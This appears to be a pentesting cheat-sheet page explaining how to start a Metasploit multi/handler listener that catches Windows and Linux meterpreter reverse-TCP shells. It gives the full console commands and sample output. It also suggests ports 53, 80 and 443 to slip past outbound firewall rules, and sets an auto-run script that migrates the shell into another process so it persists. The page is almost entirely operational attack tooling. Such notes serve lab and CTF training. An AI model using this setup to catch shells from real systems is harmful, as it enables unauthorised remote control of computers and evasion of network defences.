---
title: "Metasploit Listener"
date: 2025-7-25
tags: ["Metasploit", "Firewall", "Reverse Shell", "Shellcode", "Listener", "Reverse Shell", "Msfconsole"]
---

### Start a Metasploit Listener

```console
msfconsole -q
```

```console {class="sample-code"}
$ msfconsole -q
msf6 >
```

```console
use exploit/multi/handler
```

```console {class="sample-code"}
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

```console
# Windows x64
set payload windows/x64/meterpreter/reverse_tcp
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```

```console
# Linux amd64
set payload linux/x64/meterpreter/reverse_tcp
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
```

```console
set lhost <LOCAL_IP>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lhost 10.10.14.31
lhost => 10.10.14.31
```

```console
set lport <LOCAL_PORT>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
```

```console
# Useful for multiple connections
set exitonsession false
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set exitonsession false
exitonsession => false
```

```console
run -j
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.10.14.4:1337     <----- Press Enter
```

<small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>

#### If the Shell Die Immediately, We can Try to Migrate it to Another Process

```console
# Create a automigrate.rc script
run post/windows/manage/migrate
```

```console {class="sample-code"}
$ cat automigrate.rc 
run post/windows/manage/migrate
```

<br>

```console
msfconsole -q
```

```console {class="sample-code"}
$ msfconsole -q
msf6 >
```

```console
use exploit/multi/handler
```

```console {class="sample-code"}
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

```console
set payload windows/meterpreter/reverse_tcp
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

```console
set lhost <LOCAL_IP>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lhost 10.10.14.31
lhost => 10.10.14.31
```

```console
set lport <LOCAL_PORT>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
```

```console
set AutoRunScript multi_console_command -r automigrate.rc
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set AutoRunScript multi_console_command -r automigrate.rc
AutoRunScript => multi_console_command -r automigrate.rc
```

```console
run
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.31:1337 
```